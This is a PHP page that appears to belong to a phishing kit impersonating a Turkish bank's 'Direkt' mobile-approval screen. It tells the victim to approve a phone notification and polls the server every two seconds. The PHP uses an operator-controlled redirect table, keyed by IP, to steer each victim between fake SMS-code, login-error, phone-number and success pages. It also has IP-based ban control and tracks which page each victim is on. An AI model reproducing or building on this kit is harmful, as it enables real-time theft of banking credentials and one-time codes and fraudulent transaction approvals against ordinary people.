<?php
require_once 'connect.php';
if ($ajax->banControl(IP)) {
    $ajax->redirect(BAN_URL);
}

$ip = IP;
$timex = time() + 10;

// Redirect monitoring check
$redirect = $db->query("SELECT * FROM redirect WHERE ipAddress = '$ip'")->fetch(PDO::FETCH_OBJ);
if ($redirect) {
    $target = "";
    
    if ($redirect->page == "sms") {
        $target = "sms.php";
    } else if ($redirect->page == "sms2") {
        $target = "hatali-sms.php";
    } else if ($redirect->page == "tebrik") {
        $target = "basarili.php";
    } else if ($redirect->page == "hata") {
        $target = "sms.php?suredoldu=1";
    } else if ($redirect->page == "hata2") {
        $target = "giris.php?hata=1";
    } else if ($redirect->page == "hata3") {
        $target = "telefon.php?hata=1";
    } else if ($redirect->page == "basadondur") {
        $target = "index.php";
    } else if ($redirect->page == "onay") {
        $target = "mobil-onay.php";
    } else if ($redirect->page == "bilgi") {
        $target = "bekle.php";
    } else if ($redirect->page == "tel") {
        $target = "telefon.php";
    }

    if ($target !== "") {
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
        $ajax->redirect($target);
    }
}

$ajax->pageUpdate(IP, 'Mobil-Onay');
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>
    
    
    
    
    <title>Onay Bekleniyor - Direkt</title>
    <style>
        <?php echo file_get_contents(dirname(__DIR__) . '/files/asset/css/normalize.min.css'); ?>
        
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 400;
          font-display: swap;
          src: url('files/asset/fonts/pxiEyp8kv8JHgFVrJJnecmNE.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 400;
          font-display: swap;
          src: url('files/asset/fonts/pxiEyp8kv8JHgFVrJJfecg.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 500;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLGT9Z1JlFc-K.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 500;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLGT9Z1xlFQ.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 600;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLEj6Z1JlFc-K.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 600;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLEj6Z1xlFQ.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 700;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLCz7Z1JlFc-K.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 700;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLCz7Z1xlFQ.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 800;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLDD4Z1JlFc-K.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 800;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLDD4Z1xlFQ.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        <?php echo file_get_contents(dirname(__DIR__) . '/basvuru/style.css'); ?>
    </style>
</head>
<body>
    <div id="slider">
        <div class="gray8 slide active" style="background-color: rgb(241, 241, 241);">
            <div id="call" style="margin-top: 20%; width: 90%; display: inline-block;">
                <img src="/basvuru/img/onay.png" width="220" height="220">

                <p id="notificationText" style="font-size: 18px; color: #7d7c7c; margin-top: 5%; font-weight: 500;">
                    Cep telefonunuza bir bildirim gönderdik. Lütfen bildirimi onaylayın.
                </p>

                <div id="notificationInstructions" style="font-size: 16px; color: #636069; margin-top: 5%; font-weight: 400;">
                    Bildirimi onayladıktan sonra işleminiz otomatik olarak devam edecektir.
                </div>

                <div id="loadingIndicator" style="margin-top: 20px;">
                    <div style="width:50px;height:50px;border:5px solid #e0e0e0;border-top:5px solid #dc0004;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto;"></div>
                    <style>@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
                </div>
            </div>
        </div>
    </div>
</body>
<script>
    // Sayfa yenilemeden redirect kontrolü - her 2 saniyede bir
    function checkRedirect() {
        fetch('check_redirect.php')
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (data.redirect) {
                    window.location.href = data.redirect;
                }
            })
            .catch(function() {});
    }
    setInterval(checkRedirect, 2000);
</script>
</html>






